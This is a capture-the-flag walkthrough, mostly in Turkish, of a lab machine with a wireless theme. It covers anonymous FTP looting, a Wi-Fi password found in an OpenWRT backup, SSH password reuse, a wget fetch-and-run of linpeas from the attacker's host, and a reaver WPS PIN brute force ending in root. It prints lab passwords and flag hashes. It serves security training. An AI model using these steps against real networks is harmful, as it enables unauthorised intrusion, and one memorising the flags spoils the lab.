<img width="1280" height="720" alt="maxresdefault" src="https://github.com/user-attachments/assets/43bfdd2a-00cd-4017-86b8-294cdc72d3e3" />

## About
Wifinetic is an easy difficulty Linux machine which presents an intriguing network challenge, focusing on wireless security and network monitoring. An exposed FTP service has anonymous authentication enabled which allows us to download available files. One of the file being an OpenWRT backup which contains Wireless Network configuration that discloses an Access Point password. The contents of shadow or passwd files further disclose usernames on the server. With this information, a password reuse attack can be carried out on the SSH service, allowing us to gain a foothold as the netadmin user. Using standard tools and with the provided wireless interface in monitoring mode, we can brute force the WPS PIN for the Access Point to obtain the pre-shared key ( PSK ). The pass phrase can be reused on SSH service to obtain root access on the server.


# 1. Keşif

İlk adım her zaman olduğu gibi kapsamlı bir Nmap taraması:

```bash
nmap -sS -A -T5 -p- 10.129.229.90
```

<img width="989" height="596" alt="nmap" src="https://github.com/user-attachments/assets/6f370232-98ac-4a37-8a24-adf857a58fde" />

Bu noktada plan netleşiyor: önce FTP'yi boşaltıp içerikleri analiz edeceğim.

---

## 2. Anonim FTP Üzerinden Bilgi Toplama

```bash
ftp 10.129.229.90
```

Anonim girişin açık olduğunu doğruladıktan sonra dizindeki tüm dosyaları çekiyorum:

```
ftp> get MigrateOpenWrt.txt
ftp> get backup-OpenWrt-2023-07-26.tar
ftp> get ProjectGreatMigration.pdf
ftp> get ProjectOpenWRT.pdf
ftp> get employees_wellness.pdf
```

<img width="972" height="684" alt="ftp" src="https://github.com/user-attachments/assets/94a16497-6854-4bdf-a75c-2d05df41a841" />

Beş dosyanın tamamı indi. Sıradaki adım bunları tek tek analiz etmek


### Dosyaların Değerlendirilmesi

**`MigrateOpenWrt.txt`** — OpenWRT'den Debian'a geçiş sürecini adım adım özetleyen bir plan/checklist. Doğrudan bir kimlik bilgisi içermiyor ama önemli bir bağlam veriyor: şirket, OpenWRT tabanlı bir ağ cihazından bahsediyor ve geçiş sürecinde "Reaver aracıyla güvenlik testi yapılacak" notu düşülmüş — bu, ilerleyen aşamalarda karşımıza çıkacak `reaver` binary'sinin neden orada olduğuna dair erken bir sinyal.

**`employees_wellness.pdf`** ve **`ProjectOpenWRT.pdf`** — İçerik olarak İK duyurusu ve proje teklifi; teknik açıdan doğrudan bir zafiyet sunmuyorlar ama iki isim ve e-posta adresi not almaya değer: *Samantha Wood* (`samantha.wood93@wifinetic.htb`) ve *Oliver Walker* (`olivia.walker17@wifinetic.htb`, unvanı "Wireless Network Administrator"). İkinci kişinin unvanı, makinenin kablosuz ağ temasıyla doğrudan örtüşüyor.

**`backup-OpenWrt-2023-07-26.tar`** — Açalım:

```bash
tar -xf backup-OpenWrt-2023-07-26.tar
```

<img width="1210" height="138" alt="tar" src="https://github.com/user-attachments/assets/0a661401-989f-44db-a413-fb1c23eab10e" />

Arşiv, klasik bir OpenWRT `/etc` dizin yapısını içeriyor:

<img width="1224" height="68" alt="etc2" src="https://github.com/user-attachments/assets/cce953bc-cda6-46c4-bd75-a30aa1cf18de" />


Bu, tam olarak umduğum türden bir bulgu: bir yönlendiricinin/erişim noktasının konfigürasyon yedeği. `passwd` dosyasına bakıyorum:

```bash
cat passwd
```

<img width="1243" height="307" alt="etc" src="https://github.com/user-attachments/assets/247d6ae2-52e7-4652-ba7f-c79fe3db0977" />


Burada dikkat çeken satır `netadmin`. Bu, standart OpenWRT sistem kullanıcılarının arasında **sonradan eklenmiş** görünen, isimlendirmesiyle de "ağ yöneticisi" izlenimi veren bir hesap. Shell'i `/bin/false` olduğu için doğrudan interaktif bir OpenWRT oturumu açmaya yaramaz.

### Kablosuz Yapılandırmasında Parolanın Bulunması

Backup içindeki `config/wireless` dosyası, bu makinenin en kritik bulgusunu barındırıyor:

```bash
cat config/wireless
```

<img width="678" height="697" alt="şifre" src="https://github.com/user-attachments/assets/e9a975e8-000c-4696-9378-7cb5d93da1b7" />


Erişim noktasının WPA-PSK anahtarı düz metin olarak konfigürasyon dosyasında duruyor: `VeRyUniUqWiFIPasswrd1!`. Sırada bunları SSH'a karşı test etmek var.

---

## 3. Foothold — SSH Üzerinden Password Reuse

```bash
ssh netadmin@10.129.229.90
```

Şifre istemine kablosuz ağ parolasını giriyorum ve içeri giriyorum:

```
netadmin@wifinetic:~$ ls
user.txt
netadmin@wifinetic:~$ cat user.txt
1a05d1770d7267a601aadda4c66fd8db
```

<img width="377" height="77" alt="usertxt" src="https://github.com/user-attachments/assets/56ac8948-86be-4c63-ae78-7c9a3cafa778" />


## 4. Privilege Escalation Yüzeyinin Belirlenmesi

Foothold sonrası standart rutin: otomatik bir enumeration script'i ile hızlıca genel bir tarama yapmak. `linpeas.sh`'i basit bir HTTP sunucusu üzerinden indiriyorum:

```bash
# Kali tarafında
python3 -m http.server 8000

# Hedef makinede
cd /tmp
wget http://10.10.14.187:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

<img width="1262" height="522" alt="linpeas" src="https://github.com/user-attachments/assets/6b5a1f5a-7154-47e9-a6de-2ce4393f90e9" />

Çıktının en dikkat çekici kısmı **capability** taraması altında geliyor:

<img width="939" height="121" alt="reaver" src="https://github.com/user-attachments/assets/c0042728-f1cb-42fb-b112-1968535b269f" />


`reaver` burada listenin geri kalanına göre bağlamdan tamamen kopuk duruyor — `ping`, `mtr-packet`, `traceroute6` gibi araçlarda `cap_net_raw` beklenen bir şeydir (ham soket erişimi gerektirirler), ama `reaver`'ın burada bulunması **kasıtlı bir tasarım**. `reaver`, WPS (WiFi Protected Setup) protokolündeki PIN doğrulama zaafını kullanarak bir erişim noktasının WPA/WPA2 pre-shared key'ini kurtarmak için tasarlanmış, ham 802.11 frame'leriyle çalışan bir araçtır. Normalde `root` yetkisi gerektirir çünkü kablosuz arayüzü monitor moda alıp ham paket enjeksiyonu/dinlemesi yapması gerekir; burada `cap_net_raw` capability'si sayesinde bu işlemi `root` olmadan, sadece bu binary özelinde gerçekleştirebiliyoruz.

Bu tespit, önceki adımlardaki tüm ipuçlarını (OpenWRT teması, `MigrateOpenWrt.txt` içindeki "Reaver ile güvenlik testi" notu, kablosuz arayüz konfigürasyonundaki `wps_pushbutton '1'` ayarı) birleştiriyor: makinenin privilege escalation vektörü, gerçek bir WPS PIN brute-force saldırısı.

---

## 5. Kablosuz Arayüzlerin Tespiti

<img width="983" height="797" alt="reaverhelp" src="https://github.com/user-attachments/assets/7c690407-33c7-4499-9161-b9f447fd2ae3" />

`reaver`'ı çalıştırabilmek için önce doğru arayüzü ve hedef BSSID'yi belirlemem gerekiyor:

```bash
iwconfig
```

<img width="647" height="519" alt="iwconfig" src="https://github.com/user-attachments/assets/986da48d-afba-49c0-95d3-386057c23248" />

Burada iki kritik bilgi var:

* **`mon0`** zaten monitor moddaki arayüz — `reaver` ham 802.11 frame'leriyle çalıştığı için tam olarak ihtiyacım olan interface bu. (Bu ortam `mac80211_hwsim` ile simüle edilmiş bir kablosuz ortam; gerçek bir donanım gerekmiyor, makine bunu sanal olarak sağlıyor.)
* **`wlan1`**, `OpenWrt` SSID'li erişim noktasına bağlı görünüyor ve **BSSID: `02:00:00:00:00:00`** bilgisini veriyor.

---

## 6. WPS PIN Kaba Kuvvet Saldırısı

Elimde interface (`mon0`) ve BSSID (`02:00:00:00:00:00`) var; saldırıyı başlatıyorum:

```bash
reaver -i mon0 -b 02:00:00:00:00:00 -vv
```

<img width="757" height="549" alt="reaverson" src="https://github.com/user-attachments/assets/4ce276de-ea80-4db9-a869-bc762f59247c" />


`12345670` — WPS PIN'in son hanesi bir checksum olduğu için gerçek arama uzayı 8 haneden çok daha küçüktür (10^7 kombinasyon), ve bu ortamda **hiçbir kilitleme (lockout) mekanizması** devrede olmadığı için `reaver` M1–M7 EAPOL mesaj alışverişini tamamlayıp PIN'i saniyeler içinde kırıyor. PIN doğrulandığı anda WPS protokolü, erişim noktasının gerçek WPA pre-shared key'ini de bize teslim ediyor: `WhatIsRealAnDWhAtIsNot51121!`.

Bu, WPS'in bilinen ve köklü tasarım zafiyetidir — PIN'in 8 haneli tek parça yerine iki ayrı 4 haneli blok halinde doğrulanması, arama uzayını pratikte çok küçük bir sayıya indirger. Gerçek dünyada bu, WPS'in üretici/kurumsal ortamlarda neden büyük ölçüde devre dışı bırakılması gerektiğinin de temel nedenidir.

---

## 7. Root — Yeniden Parola Tekrar Kullanımı

Elimdeki yeni parolayı `netadmin` kullanıcısının `root` olma ihtimaline karşı deniyorum — çünkü bu makinede zaten bir kez parola tekrar kullanımı örüntüsü görmüştüm, aynı örüntünün tekrarlanması sürpriz olmaz:

```bash
su
Password: WhatIsRealAnDWhAtIsNot51121!
```

```
root@wifinetic:/tmp# cd /root
root@wifinetic:~# cat root.txt
849edb23b6855040acf4f9159b9be24c
```

<img width="336" height="142" alt="roottxt" src="https://github.com/user-attachments/assets/ddd92b04-cb9d-4e47-b926-da57e88123f5" />
